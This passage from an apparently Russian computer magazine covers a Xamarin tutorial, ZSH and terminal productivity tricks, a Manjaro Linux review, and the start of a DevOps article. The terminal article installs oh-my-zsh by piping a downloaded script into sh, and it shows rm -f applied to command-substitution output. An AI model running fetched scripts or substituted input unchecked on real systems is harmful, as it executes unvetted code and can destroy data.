промотай список вниз и разверни пункт  Xamarin, далее выбери пункт
«Параметры iOS». Справа будет кнопка «Найти Xamarin Mac Agent», нажми ее.
Откроется мастер, на  второй  странице  которого надо  нажать  кнопку
«Добавить компьютер Mac…» и ввести IP‐адрес мака. Появится окно авто ‐
ризации, введи туда данные маков ского юзера.


Для построения пользовательского интерфейса могут быть использованы
два подхода: нативный и кросс‐платформенный. При первом случае для каж‐
дой платформы приходит ся отдельно готовить макет окна приложения.
Во втором случае разрабатывается один макет, который одинако во, с учетом
особенностей системы, отобража ется на всех поддерживаемых платформах.
То есть рендерится нативными средствами соот ветству ющей ОС. Для этого
используется Xamarin.Forms.
  Перейдем к созданию нашего простого учебного проекта: «Файл → Соз‐
дать → Проект». Не забудь перед началом активизировать Hyper‐V. Набор
предустановленных шаблонов впечат ляет, но нам нужна определенная
заготовка: Visual C# → Cross‐Platform. Будет пред ложено сделать выбор
в пользу одного из двух описанных выше режимов. В этом же окне можно
выбрать шаблон: «Пустое приложение», «Основной вид и подробности».
Выберем первое, так как нам нужно минимальное приложение, а второе
включает несколько страниц, разных визу альных компонентов, что нам
не подходит. В итоге будет соз дано четыре проекта: общий код, Android, iOS,
UWP.
  Создание общего кросс‐платформенного интерфейса возможно или на
XAML, или на C#. Графического конструирования не предусмотрено — оче‐
видно, из‐за различия графических компонентов. В Visual Studio графически
моделировать можно только интерфейс для UWP‐приложе ний. Итак, нам нуж‐
ны два элемента на форме: надпись и кнопка. Воспользуемся языком XAML.
В файле MainPage.xaml замени создание над писи таким кодом:


<StackLayout>
    <Label Text="Hello World!"
        FontSize="Large"
        TextColor="Red"
        HorizontalOptions="Center" />
    <Button x:Name="but"
        HorizontalOptions="Center"
        Text="Click: 0"
        Clicked="OnButtonClicked" />
</StackLayout>

Здесь создается стековая компоновка (объекты один под другим), надпись
с заданием выравнивания положения по середине кон тейнера, большой раз‐
мер шриф та, его цвет и собственно текстовая метка. Затем кнопка со свой‐
ствами: имя, выравнивание, метка, объ явление события нажатия.
  Перейди в файл MainPage.xaml.cs и внутри класса MainPage напиши
в нем обработчик нажатия этой кнопки:


private void OnButtonClicked(object sender, EventArgs e) {
    (sender as Button).Text = "Click: " + ++num;
}

Не забудь объявить переменную: int num = 0;.
  Все приходится набирать вручную, поэтому в последнее время прихожу
к тому, что для ускорения кодирования надо использовать Reshaper.
   Теперь, делая соответствующий проект активным, компилируй и раз‐
вертывай его на любом поддерживаемом девайсе (или эму лято ре). В момент
развертывания приложения на мобильном устройстве на него заливается
в зависимости от платформы соот ветствующая среда выполнения: Mono An‐
droid, Mono iOS или Mono UWP.





                              Android emulator


Наше зак лючение
Итоговые размеры: UWP‐проект — 18,6 Мбайт, Android‐про ект — 4,53 Мбайт.
Скорость работы такая же, как у нативных приложений, плюс полное пок рытие
возможностей API (почему? См. первую часть статьи).
   Visual Studio — удобная среда разработки, работать в ней привычно Win‐
dows‐кодеру. Visual Studio Community вместе с Xamarin распространяется
бесплатно и содержит большую часть возможностей профессиональной вер‐
сии. Среда располагает широчайшей функциональностью в плане мобильной
разработки. Имеет кучу документации, тысячи примеров, сотни обу чающих
видеокурсов, как официальных на канале Channel 9, так и любительских
на YouTube. Последние попадаются весьма высокого качества. Поэтому изу ‐
чение данной технологии лишь дело времени и трудолюбия.


Multi-OS  Engine —  второй кросс‐плат форменный  зверь, позволяющий
на одном языке, в данном случае Java, разрабаты вать приложения для двух
мобильных систем: iOS и Android. О нем можно прочитать в другой моей
статье.



ИТОГИ
В мини‐цикле из двух статей мы рассмотрели самые популярные инструмен‐
ты для разработки мобильных приложений. С практической сто роны име‐
ющиеся на сегодняшний день средства делятся на три типа: Silo, black box,
cross‐platform. Подход Silo позволяет пол ностью раскрыть потенциал опре‐
деленной платформы, но из‐за жесткой привязки к целевой плат форме он
неудобен, если нужно портировать разрабатываемое приложение на дру гую
операционную систему.
   Black box позволя ет создать толь ко довольно огра ниченные приложения.
Средств black box может хватить на весьма изощренные программы, но, ког‐
да на кону будут вопросы производительности, расширения, масштабиро‐
вания, взаимодействия со специфическими компонентами, black box окажет‐
ся неспособным ответить на изменившиеся требования.
   Кросс‐платформенный вариант на текущий момент пред ставляется луч‐
шим способом создания мультиплатфор менных приложений. Он избавлен
от всех недостатков других подходов и добав ляет при этом свои плю сы. Он
заключает в себе мощную среду разработ ки, один язык программирования,
полностью покрывающий воз можности всех поддерживаемых платформ,
быструю среду выпол нения, скорость которой приравнивается к нативной,
удобные средства развертывания и отладки приложений на всем парке
девайсов.
  Всем удачи и до встречи в кросс‐платформенной среде!
UNIXOID

 ПРОКАЧАЙ
 ТЕРМИНАЛ





                                             Евгений Зобнин
                                              zobnin@glc.ru


        ПОЛЕЗНЫЕ ТРЮКИ, КОТОРЫЕ
       СДЕЛАЮТ ТЕБЯ ГУРУ КОНСОЛИ





О том, что командная строка — это удоб ней ший инструмент,
знает любой юниксоид, потративший пару часов на изучение
базовых команд и син таксиса bash. Но далеко не каждый
понимает, нас колько на самом деле может быть эффективна
консоль. В этой статье мы разберем множество интересных
трюков, которые позволят тебе так про качать навык обра‐
щения с командной строкой, что ты уже не захочешь воз вра‐
щаться к графичес кому интерфейсу.


Эта статья не обучит тебя, как пользоваться консолью, как объединять коман‐
ды в пайпы и перенаправлять ввод‐вывод. Она не о том, как писать скрипты
или функции. Из нее ты не узнаешь, чем отличается bash от tcsh. Ее задача —
показать тебе, как использовать консоль на всю катушку, добавить +50 к ско‐
рости ввода команд и +100 к эффективности. Поэтому новичкам стоит начать
с базовых руководств или хотя бы изучить linux cheat sheet.
  А мы, недолго думая, перейдем к делу.


МИГРИРУЕМ НА ZSH
Первое, что стоит сделать перед началом прокачки скиллов, — это избавить‐
ся от bash. Не потому, что он плохой или уста ревший, а потому, что существу‐
ет ZSH. Он неиллюзорно повысит твою продуктивность.
  ZSH — очень сложный и комплексный командный интерпре татор. Полное
руководство ZSH насчитывает около 800 страниц, а абсолютно все его фун‐
кции, наверное, не знает никто. Но этого ни от кого и не тре буют. На свете
уже несколько лет существует проект oh‐my‐zsh, где пользовате ли создают
набор скриптов, с помощью которых можно твикать и настраивать ZSH быс‐
тро и легко.
   Чтобы получить стандартный набор твиков и настро ек, включая мощный
механизм автодопол нения, информатив ное приглашение к вводу команды,
настройки, повышающие удобство работы с ZSH, достаточно просто уста‐
новить oh‐my‐zsh. Далее его можно обвешать плагинами для большего
удобства работы с разными приложениями и поменять тему приглашения
на любую из десятков, созданных пользователями.
   Итак, для начала устанавливаем ZSH:


$ sudo apt‐get install zsh

А затем скачива ем и устанавливаем oh‐my‐zsh:


$ sh ‐c "$(curl ‐fsSL https://raw.githubusercontent.com/robbyrussell/
oh‐my‐zsh/master/tools/install.sh)"

Скрипт установки клонирует git‐репозиторий в каталог /home/username/.oh‐
my‐zsh, добавит необходимые правки для вызова нужных скриптов в конфиг /
home/username/.zshrc и запустит ZSH.





                      Устанавливаем oh‐my‐zsh


Теперь необходимо сделать ZSH шеллом по умолчанию:


$ sudo usermod ‐s /usr/bin/zsh имя_юзера

И перелогиниться, чтобы эмулятор терминала использовал ZSH в качестве
дефолтового шел ла. В качестве опционального шага ты можешь изменить
тему. В комплект oh‐my‐zsh входит огромное количество тем, ознакомиться
с которыми можно на wiki‐странице. Чтобы выб рать новую тему, исправь зна‐
чение переменной ZSH_THEME в файле ~/.zshrc. Выберем, например, тему
agnoster:


ZSH_THEME="agnoster"





                           Тема agnoster


ПЕРЕМЕЩАЕМСЯ ПО КАТАЛОГАМ БЫСТРО
Одна из главных проблем консоли состоит в том, что ее неудобно исполь‐
зовать для перемещения по каталогам. Особенно если вло женных каталогов
много, они имеют длин ные имена, а еще хуже — похожие имена. В этом слу‐
чае система автодополнения с помощью кнопки Tab помогает плохо и все,
что остается, — это печатать имена каталогов руками.
  ZSH упрощает навигацию. Во‐первых, он умеет исправлять регистр букв,
поэтому ты можешь начать печатать неч то вроде


$ cd ~/do

Затем нажать Tab и получить это:


$ cd ~/Downloads

Во‐вторых, система автодополнения имен каталогов ZSH намного развитее
своего аналога из bash. Если ZSH обнаружит, что с введенных тобой сим‐
волов начинаются имена сразу нескольких каталогов, он не будет пищать,
а затем выводить список каталогов, заставляя тебя уточнять запрос, а сразу
выведет список и позволит выбрать нужный каталог с помощью Tab или стре‐
лок.




                     Вы бираем каталог


В‐третьих, автодопол нение работа ет не только для начала имени каталога/
файла, но и для любой его части. Чтобы перейти в каталог ~/Downloads, ты
можешь набрать load и нажать Tab.
  Наконец, в‐четвертых, ZSH умеет допол нять имена каталогов по всему
пути, а не только в последней его части. Это зна чит, что ты можешь напеча‐
тать нечто вроде этого:


$ cd /u/s/zs

Затем нажать Tab и получить это:


$ cd /usr/share/zsh

Более того, тебе совсем не обя зательно печатать даже первые бук вы имен
каталогов. ZSH и bash умеют находить нужные каталоги самостоятельно, если
они перечислены в переменной CDPATH. Добавь, например, следующую
строку в ~/.zshrc:


export CDPATH=/var/www:/home/имя_юзера/Dropbox

Теперь, чтобы открыть каталог ~/Dropbox/Books, можно использовать такую
команду:


$ cd Books

ZSH проверит, есть ли каталог Books в /var/www или /home/имя_юзера/Drop‐
box, и переместит тебя в него, если он существует.


Fasd
Есть и гораздо более мощное средство для перемещения между каталогами.
Это утилита fasd (произносится как fast — быстрый). Она запоминает все
каталоги (и просто пути к файлам), которые ты использовал, и позволя ет
перемещаться между ними, указав лишь часть пути (даже несколько букв).
  Работает  это   так.  Допустим,  ранее  ты  переходил  в  каталог
~/src/projects/apps/myCoolApp и теперь, спустя часы или даже дни, хочешь
в него вернуться. Все, что тебе необходимо сделать, — это выполнить такую
команду:


$ z myCoolApp

Можно проще:


$ z CoolApp

И еще проще:


$ z Cool

Требование одно: указанный тобой набор символов должен быть уникальным
среди всех путей, которые запомнил fasd. Кроме z, fasd поддерживает и дру ‐
гие шорткаты: a — показывает все сохраненные пути, zz — позволяет перейти
в каталог, используя интерактивное меню (если введенный набор символов
встречается в нескольких путях), v — открывает файл в редак торе Vim.
   Утилита fasd доступна для Debian/Ubuntu, Arch Linux через AUR и для ma‐
cOS через brew. Уста новить в Ubuntu мож но так:


$ sudo add‐apt‐repository ppa:aacebedo/fasd
$ sudo apt‐get update
$ sudo apt‐get install fasd

Далее необходимо активировать пла гин fasd в ~/.zshrc:


plugins=(git fasd)


Peco
Peco — еще один инструмент, способный сильно облегчить навигацию, а так ‐
же поиск. Это небольшая утилита, которая принимает на вход список строк
и выводит на экран псев дографическое меню, с помощью которого можно
выбрать или найти нужную строку. Далее peco отдает эту строку на выход
и завершает свою работу (по сути, это консольный аналог dmenu).
   Peco можно использовать для навигации и поиска в любых тек стовых стро‐
ках, включая  пути. Например, если ты запустишь следующую команду
и выберешь каталог, peco напечатает его имя в тер минале:


$ ls | peco

Не слишком удобно и полезно. Однако, немного усложнив пример, ты
получишь интерактивный cd:


$ cd `ls | peco`

Польза появилась, удобство пострадало. Поэтому создадим для этой коман‐
ды короткий и простой псевдоним. Для этого добавим следующую строку
в ~/.zshrc:


alias cdi='cd `ls | peco`'

Теперь команда cdi будет запускать наш интерактивный cd.
   Кстати, о самом cd. Запомни два простых правила:
 • команда cd без аргу ментов отправит тебя в домашний каталог;
 • команда cd - вернет в предыдущий каталог.





                              Peco


ИСПОЛЬЗУЕМ АВТОДОПОЛНЕНИЕ НА ПОЛНУЮ КАТУШКУ
Система автодополнения ZSH интересна не только своими интеллектуаль‐
ными функциями, но и тем, что она работает не с одними именами катало гов
и файлов. ZSH умеет дополнять фла ги и опции многих утилит и выводить
удобную справку по ним, умеет дополнять названия пакетов apt‐get, yum, pac‐
man и других пакетных менеджеров, дополняет имена хостов при подклю‐
чении по SSH. Если набрать kill и нажать кнопку Tab, ZSH выведет список про‐
цессов. После второго нажатия Tab список станет интерактивным, и ты смо‐
жешь выбрать процесс, который следует умертвить.
  Кроме встроенных правил автодопол нения, on‐my‐zsh имеет мно жество
плагинов с правилами автодополнения для многих утилит и приложе ний.





                                                  Kill Tab Tab


РАБОТАЕМ С ИСТОРИЕЙ КОМАНД
Любой современный командный интерпретатор, будь то ZSH или bash, сох‐
раняет историю введенных команд. ZSH хранит историю в файле /home/
username/.zsh_history. При необходимости его можно погрепать (grep ls
~/.zsh_history), чтобы найти нужную команду. Но делать это совсем не обя‐
зательно, ведь командный интерпретатор уже имеет в своем арсенале набор
средств для работы с историей.
  Например, следующая команда вставит в строку вво да пре дыдущую
команду:


$ !!

Ее особенно удобно использовать, если забыл ука зать sudo перед командой,
требующей права root:


$ pacman ‐Syu
error: you cannot perform this operation unless you are root.
$ sudo !!
sudo pacman ‐Syu

Можно взять из истории только аргумент команды. Например:


$ cd /home/user/foo
cd: /home/user/foo: No such file or directory
$ mkdir !*
mkdir /home/user/foo

А так можно вставить в строку ввода последнюю команду, начинающуюся
с указанных символов:


$ !qwerty

Если же нужно найти команду с указанными символами где‐то в середине
или в конце, можно сделать так:


$ !?qwerty?

Ты можешь даже исправлять описки в последней введенной команде:


$ ^dc^cd

С помощью комбинации Ctrl + R команды можно искать в интерак тивном
режиме. Просто начни вбивать символы, присутствующие в команде, и ZSH
вставит в строку ввода нужную команду. Это очень удоб ная функция, но ее
можно сделать еще удоб нее, если использовать возможности уже знакомого
нам peco.
  В Сети можно найти сторонний плагин для oh‐my‐zsh под названием zsh‐
peco‐history. Просто скачай его в каталог сторонних плагинов ZSH:


$ git clone https://github.com/jimeh/zsh‐peco‐history.git $ZSH_CU
STOM/plugins/zsh‐peco‐history

И активируй в ~/.zshrc:


plugins=(git fasd zsh‐peco‐history)

Теперь комбинация Ctrl + R будет запускать пол ноэкранное меню peco вмес‐
то однострочной поисковой строки.


КОПИРУЕМ, УДАЛЯЕМ, ПЕРЕИМЕНОВЫВАЕМ
Казалось бы, что может быть проще, чем скопировать или переименовать
файл? Просто вбиваешь команду cp или mv, а затем старое и новое имена:


$ cp httpd.conf httpd.conf.bak

Но зачем утруждать себя, нажимая лишние кнопки, если можно сделать так:


$ cp httpd.conf{,.bak}

Строка, содержащая фигурные скобки с двумя строками, разделенными
запятой, будет развернута в две строки, в одной из которых будут символы
до запятой, а в другой — символы после.
  Можно пойти дальше и использовать не просто замену строк, а регуляр‐
ные выражения. Для этого нам понадобит ся коман да rename:


$ rename 's/регулярка/на_что_заменить/' *.txt

Такая коман да заменит все подстроки, подпадающие под  регулярное
выражение, в именах всех файлов с расширением .txt. Недурно, не правда
ли?
   Также стоит изучить команду basename. При обычном использовании она
просто выводит последний элемент пути:


$ basename /usr/bin/zsh
zsh

Но также ее можно использовать для отрезания частей строки, например:


$ basename file.txt .txt
file

Ты можешь спросить, что это дает? А вот что:


$ for file in *.png; do convert "$file" "`basename "$file" .png`.
jpg" ; done;

Это перекодировщик всех файлов PNG в JPG. Команда крайне проста: мы
создаем цикл, который проходит ся по всем файлам PNG в текущем каталоге,
затем запускает команду convert для перекодировки их в JPG. Basename
здесь нужен для того, чтобы дать новым файлам корректное имя. Хинт:
обратные кавычки запускают заключен ную в себя команду в так называемом
субшелле. Они нужны для запуска одной команды из другой.
   Чтобы понять их мощь, обрати внимание на следующую команду:


$ rm ‐f `tar ztf /path/to/file.tar.gz`

Уверен, эта команда не раз спасет тебя, когда ты распаку ешь архив tar.gz не в
тот каталог. Она удаляет все ранее распакованные файлы.


ИЩЕМ ПРАВИЛЬНО
Ты уже должен знать, что в любой UNIX‐системе есть команда ﬁnd, пред‐
назначенная для поиска файлов. Использовать ее предельно просто:


$ find . ‐name *.c ‐type f

Эта команда найдет все файлы с расширением .c в текущем каталоге и во
всех его подкаталогах. Но что делать, если в каждом из этих файлов необ‐
ходимо найти строку open? А вот это:


$ find ‐name *.c ‐type f | xargs grep open





                  Ищем open в файлах .c


Можно и несколько по‐другому:


$ find . ‐name *.c ‐exec grep ‐H open {} ;

Этот пример немного сложнее  и, как ни странно, медленнее. Почему?
Потому, что xargs распарал лелит поиск, запустив отдельный процесс grep
на каждую строку.
  При желании от ﬁnd можно вообще избавиться:


$ grep ‐R open ‐‐include="*.c".

По сути, это эквивалент предыдущей команды.


РАБОТАЕМ С БУФЕРОМ ОБМЕНА
Читая эту статью, ты наверняка то и дело копировал коман ды и вставлял их
в терминал. Если нет — значит, ты набирал их сам, что правильно, память
тебя отблагодарит. В любом случае копировать и вставлять команды в тер‐
минал жутко неудобно, как, впрочем, неудобна и сама концепция копиро‐
вания/вставки.
  Однако в случае с терминалом у тебя есть один очень мощный инстру ‐
мент. Он называется xclip и позволяет копировать и вставлять в буфер обме‐
на. Для начала добавь в ~/.zshrc следующие строки и перезапусти терминал
(или ZSH):


alias ‐g xcopy='xclip ‐selection clipboard'
alias ‐g xpaste='xclip ‐selection clipboard ‐o'

Теперь, чтобы что‐то скопировать в буфер обмена, просто перенаправь
вывод в xcopy. Например:


$ uname ‐a | xcopy

В буфере обмена ока жется вывод команды uname ‐a. Вставить можно таким
же образом:


$ xpaste

Вывод также можно перенаправить. Или заключить xpaste в обратные кавыч ‐
ки, чтобы его содержимое было выполнено шеллом.


ВЫВОДЫ
Командная строка не просто мощный инструмент. Это настолько мощ ный
инструмент, что мне даже трудно придумать, какой тип интерфейса ОС может
быть эффективнее. То, о чем я написал, — такая крошечная часть верхушки
айсберга, что для описания всех трюков командной строки пот ребовалась бы
серия книг, сродни «Большой советской энциклопедии». Ну а напоследок то,
чего все так долго ждали, — dd с показом прогресса:


$ pv ‐tpreb /dev/sdb | dd of=~/sdb.img bs=1M

На этом все.


        WWW

                     •Огромный набор советов по ZSH
                    •Не менее огромный набор советов
   UNIXOID

  ПРОКАЧАННЫЙ





                                                                                   Илья Остапенко
                                                                                                   ostapenko.public@gmail.comАРЧ



                    ЗАЧЕМ НАМ MANJARO,
                   ЕСЛИ ЕСТЬ ARCH LINUX





   Мир  настольных  систем   Linux  очень  раз нообразен.
   На сегодняшний день в рейтин ге Distrowatch.com насчитыва‐
   ется 288 дистрибутивов  с самой  раз ной философией
   и областью применения. За все время существования рей‐
   тинга в него входили и исчезали сотни дистрибутивов,
   но один из них смог заво евать популярность и вырваться
   на третье мес то всего за несколько лет своего существо‐
   вания. Это Manjaro, основанный на Arch Linux дистрибутив,
   оставивший своего родителя далеко позади.


   В НАЧАЛЕ ВРЕМЕН
   Начало проекту положил австриец Роланд Зингер (Roland Singer), в середи‐
    не 2011 года сообщивший на форуме Arch Linux о том, что собрал Live CD
    с уже известным нам названием. В качестве рабочего окружения по умол‐
    чанию он выбрал XFCE. Он и остался флагманским рабочим столом системы
    поныне.





                      XFCE — флагман Manjaro Linux


    Вскоре к проекту примкнули единомышленники: фран цуз Гийом Бенуа (Guil‐
    laume Benoit) и выходец из проекта Chakra Linux Филип Мюллер (Philip Müller).
    А спустя год после первого упоминания в Сети, 20 августа 2012‐го, мир уви‐
    дел первую стабильную версию дистрибутива — Manjaro 0.8.
      Разработчики неустанно пов торя ют, что Manjaro, несмотря на свое близ‐
    кое родство с Arch Linux, по сути, полностью независимая система с собс‐
    твенными репозиториями программного обеспечения, инстру ментами нас‐
    тройки, командой разработ чиков и своим видением направления развития
    системы.
     С самых первых дней проект ставил одной из своих главных целей сделать
    такую систему, которая обеспечит доступ широкому кругу пользователей
     к мощи и простоте Arch Linux, обойдя при этом все острые углы родительско‐
    го дистрибутива, препятствующие его широкому распространению.


   В НИХ МНОГО ОБЩЕГО...
    Сильные стороны Manjaro, унаследованные от Arch Linux, — прозрачность
    и понятность системы, скорость, эффективность работы. Как и арч, Manjaro
    использует модель непрерыв ной разработ ки (rolling release), так что у поль‐
    зователя в любой момент времени ока зывается установленной самая пос‐
    ледняя версия как операционной системы в целом, так и конкрет ного прог‐
    раммного обеспечения.
      Новые релизы Manjaro регулярно появляются, но они призваны лишь
    зафиксировать текущее состояние системы и ее компонентов и дать воз‐
    можность в случае новой установ ки получить систему, не требующую загрузки
    большого количества обновлений (что непременно сломает систему).
     Еще одна особенность системы — полная совместимость с так называ‐
   емым пользовательским репозиторием Arch (Arch User Repository, AUR).
   На самом деле AUR не вполне репозиторий, вернее, это не репозиторий
    бинарных пакетов, а каталог сценариев сбор ки (PKGBUILD), позволяющих
    автоматически собрать двоичный пакет из исходников и корректно уста‐
    новить его в систему. Корректность в данном слу чае означает, что установ‐
    ленный пакет впоследствии может быть безболезненно (для системы) уда‐
    лен, то есть не оста вит за собой хвостов в виде забытых файлов, как бывает
    при ручной сборке из исходников коман дой ./conﬁgure && make && make
      install.
      Кроме того, с помощью таких же сценариев можно преобразовывать
    бинарные пакеты, изначально предназначенные для дистрибутивов с другой
    системой управления пакетами, но отсутствующие для систем, основанных
    на Arch как в виде исходников, так и в виде двоичных пакетов. Например,
    бета‐версия приложения Skype for Linux, активно разрабаты ваемая в нас‐
    тоящее время Microsoft, доступна на сайте производителя только в виде DEB‐
    и RPM‐пакетов, но ее легко можно установить из AUR.
     В Сети также доступны и другие бинарные репозитории. Один из наибо ‐
    лее известных —  archlinuxcn поддерживается  китайским сообществом.
    Решение об использовании подоб ных независимых репозиториев каждый
    из пользователей принимает на свой страх и риск, поскольку допод линно
     узнать, что скрывается в конкретном бинарнике, зачастую бывает далеко
    не просто. В общем, это уже вопрос доверия конкретному стороннему
    репозиторию.
     В этом отношении выигрышно будет смот реться локальный репозиторий
    пользователя,  размещаемый  прямо  на  рабочей  машине.  Достаточно
    выделить под репозиторий специальный каталог, поместить в нем собранные
    из исходников и отсутствующие по какой‐либо причине в свободном доступе
    бинарные пакеты, сформировать специальной командой файл базы данных
    и указать его в предпочита емом менед жере пакетов. После обновле ния
    источников приложений нужный пакет будет доступен к установке в общем
    списке пакетной базы.


    ...НО ОНИ ТАКИЕ РАЗНЫЕ
   Но не плюсы Arch Linux подвигли основателей Manjaro к созданию своей сис‐
    темы, а те минусы, точнее — особенности родительской системы, которые
    становятся естественной преградой для новичков. Дело в том, что при уста‐
    новке и настройке Arch Linux практически все приходится делать вручную —
    вводить коман ды и выполнять различные сценарии.
       Этот процесс не столь ко трудоемкий (хотя может вызвать довольно серь‐
    езные затруднения у совсем уж новичка даже на этапе чте ния инструкций),
    сколько рано или поздно надоедающий. Особенно когда нужна система,
    которая должна работать здесь и сейчас. Представь себе авто любителя,
    которому для того, чтобы переключить свет фар с дальнего на ближний, при‐
    ходилось бы останавливаться, открывать капот машины и вручную переки‐
    дывать клеммы на лампочке, каждый раз бурча себе под нос, что благодаря
    этому он теперь хорошо понима ет устройство автомобиля.
      Разработчики Manjaro внесли в систему ряд изменений, облегчающих
    установку, запуск и работу в системе, так что ее отличают:
     • простая и понятная установ ка с помощью графических инструментов;
     • автоматическая установка сторонних драйверов (сво бодных или проп‐
       риетарных, на выбор);
     • собствен ный репозиторий программного обеспечения, дополнительно
      протестированного сообществом, — в стабильной ветке содержатся
       пакеты, максимально свободные от воз можных ошибок;
     • возможность выбора и установки необходимых версий ядра Linux в гра‐
      фическом режиме.


   УСТАНОВКА В ПАРУ КЛИКОВ
    Система устанавливается с помощью гра фического инструмента Calamares,
    в разработке которого, помимо команды Manjaro, принимают участие ребята
    из Debian, Fedora, KaOS, Blue Systems и KDE Visual Design Group. Calamares
    действительно удобный инструмент, поз воляющий из одной точки вхо да пол‐
    ностью подготовить систему к установ ке и затем без проб лем ее установить.





      Графическая утилита установ ки Calamares

    Узким местом для неанглоязычного пользователя можно посчитать лишь
    некоторую неувязку с предварительным выбором языка системы. Так, если
    для будущей системы по умолчанию выбрать русский, а во время установки
    указать пароль на английском, то при пер вом запуске установленной сис‐
    темы войти в нее не удастся: раскладка клавиату ры будет русской и сменить
     ее, чтобы ввести пароль на английском, будет невозможно. Самый простой
    способ обойти эту проблему — указать цифровой пароль, а уже после входа
    в систему изменить его.


   НАМ ТУТ РАДЫ
   Сразу после первой загрузки появляется приветственное окно Manjaro Hello.
    Здесь собрана вся информация, позволяющая освоиться в системе и поз‐
    накомиться с ее ключевы ми возможностями. Тут же находится описание акту ‐
    аль ной версии дистрибутива и возможностей системы в целом, ссылки
    на форумы, чаты и вики, посвященные Manjaro (в том числе русско язычные
    форум и группа в мессенджере Telegram), а также приводятся способы при‐
    нять участие в развитии проекта. Приветственное окно полностью локали‐
    зовано и визуально вписывается в любое уста новленное рабочее окружение.





                           Главное окно Manjaro Hello

    Следующее окно — менеджер настроек Manjaro Settings Manager, в состав
    которого входят модуль региональных и язы ковых настро ек, модули управле‐
    ния учет ными записями пользователей системы, настройки даты и вре мени,
    клавиатуры и оборудования.





                  Менеджер оборудования Manjaro


   С помощью менеджера настроек также можно выб рать и установить ядро.
   На выбор дюжина ядер различных версий, в том числе помеченные флагом
    LTS и самые свежие, но, возможно, нестабильные. Одно из ядер помечено
    как рекомен дуемое и используется по умол чанию при первой установке сис‐
    темы. Присутствует и пара ядер реального времени, обеспечивающих низкую
    задержку обработки данных, что удобно при работе со звуком.





              Модуль «Ядро» менеджера настроек Manjaro


   СОФТ И ВСЕ ОСТАЛЬНОЕ
    Ставить и удалять софт также можно с помощью гра фического инструмента.
    Доступны два варианта: основанный на GTK3 Pamac и базирующийся на Qt
     Octopi. Оба — графическая надстройка над pacman, менеджером пакетов
    Arch Linux. В отличие от Octopi, разработкой которой занимаются люди
    со стороны, Pamac — детище Manjaro Linux, и в том же Arch Linux его можно
    поставить только из AUR.





     Pamac

   В обеих программах имеется возможность установки софта как из официаль‐
    ного репозитория пакетов, так и из AUR. В Manjaro существует три ветки,
    отличающиеся по степени ста бильности содержащихся в них пакетов: ста‐
    бильная, тестовая и нестабильная. Все новые версии пакетов первоначально
    попадают в нестабильную ветку, но не раньше, чем эти версии окажутся
    в репозитории Arch Linux.





                                      Octopi


   С помощью Pamac и Octopi можно уста навливать и обновлять как единич ные
    пакеты, так и всю систему в целом. Причем в отличие от Arch Linux риски
    при обновлении системы сведены к минимуму. К моменту включения в ста‐
    бильную ветку пакет проходит огонь, воду и мед ные трубы, о чем свидетель‐
    ствует последняя цифра после дефиса в номере его версии — столько раз
    пакет был пересобран, прежде чем признан ста бильным.


   Инте рес ные фак ты
     • Роллинг‐версия дистрибутива Netrunner, выпускавшаяся
       с 2014 по 2016 год, была основана на Manjaro.
     • Название Manjaro (варианты прочтения «Ман джа ро», «Манжаро», «Ман‐
       харо» равнозначны) было выбрано основателем проекта Ролан дом Зин ‐
      гером после его восхождения на африканский протовулкан Килиманджа‐
        ро. В Танзании также есть населенный пункт с названием Manjaro.
     • Первоначальный вариант логотипа в виде сти лизованной бук вы M, вер‐
       хний край которой похож на букву L, был монограммой названия сис‐
      темы — Manjaro Linux. Три вертикальные черты символизировали трех
       главных разработчиков: Зингера, Мюл лера и Бенуа.
     • В 2016 году разработчики Manjaro пред приняли массированную кампанию
       визуальной унификации. Изменения коснулись внешнего вида сетевых
       ресурсов и оформления дистрибутива. Появились собственный багтрекер
      и страница проверки статуса синхронизации зеркал. Финальным аккордом
       стало преобра жение логотипа, который сделали квадратным. При этом
      первая вертикальная черта слилась с L‐образной частью, превратившись
       в перевернутую L. Это смотрелось символично, так как Роланд Зингер
       незадолго до этого покинул проект.




   ФИРМЕННЫЙ ЗЕЛЕНЫЙ
    Manjaro отличается ярким самобыт ным интерфейсом. Основу цветовой гам‐
   мы оформления составляет зеленый в сочетании с различными оттенками
    серого. Система имеет собственные значки и курсоры, собственные темы
   оформления рабочего стола и приложений и, конечно, «новые нескучные
    обои». Все это предлагают темы оформления Maia и Vertex‐Maia в зависи‐
    мости от выбранного рабочего окружения.
       Manjaro имеет три официальные редакции: XFCE, KDE и, с недавних пор,
   GNOME. Немного особняком стоит сетевой инстал лятор Manjaro‐Architect,
    некоторое время назад пришедший на смену Manjaro NET Edition. В нем
    не предусмотрено графических компонентов вообще. Manjaro‐Architect —
    это конструктор, с помощью которого можно установить систему любой кон‐
    фигурации, загружая нужные пакеты через интернет. Этим он сильно похож
    на Arch Linux.





Множество вариантов преднастроенных рабочих столов, доступных к установке в Man‐
jaro Linux


    Кроме того, инструменты разработчика, под готовленные командой Manjaro,
    позволяют любому собрать свой собственный установочный Live CD с любым
    набором программного обеспечения и рабочим окружением. Именно поэто ‐
     му, помимо официальных редакций Manjaro, существу ет целая плеяда раз‐
    личных редакций, поддерживаемых сообществом пользователей самос‐
    тоятельно: Cinnamon, Deepin, i3, LXQt, Mate, JVM, PekWM, Openbox, Lxde,
     Fluxbox, Enlightenment, BspWM, Budgie и даже аскетичная стабильная сборка
   KDE с минимальным набором компонентов от энтузиастов русско язычного
    сообщества.


   ВЫВОДЫ
    Уникальная особен ность Manjaro в том, что это дистрибутив для всех.
   В самой своей основе Manjaro — это типич ный Arch Linux, простой, изящный
    и очень дружелюбный к тем, кому нужна полностью подконтрольная юзеру
    система. Да, здесь большое количество предустановленного софта, который
    приходится удалять, но сделать это нужно один раз — и больше не вспо ‐
    минать.
     С другой стороны, Manjaro действительно дружественный пользователю
    дистрибутив, который, в отличие от аскетичного арча, предлагает юзеру пол‐
    ностью настроенную и готовую к работе среду с необ ходимым набором инс‐
    трументов. Иногда, конеч но, придет ся полазить по файлам конфигурации,
    но в целом все можно сделать, используя графические утилиты.
      Если стоит выбор, что уста новить на новую машину, то, возможно, лучше
    быстро поставить Manjaro и со временем допилить уже готовую систему, чем
    возиться с установкой арча и превращением системы в юзабельный десктоп.



          WWW

                      •Официальный сайт
                      •Официальный форум
                          •Страница Wiki
                      •Фо рум русскоязычного сообщества
                           •Группа русскоязыч ного сообщества в Telegram
SYNACK
МАСТЕРУ
НА ВСЕ
РУКИ
5 ЛУЧШИХ
ИНСТРУМЕНТОВ
ДЛЯ DEVOPS





 Мартин urban.prankster
       Пранкевич
   prank.urban@gmail.com





Сложно представить сегодняшнюю разработку без DevOps‐
специалиста (Development + Operations), как клей, соеди‐
няющего несколько процессов — разработку, деплой, тес ‐
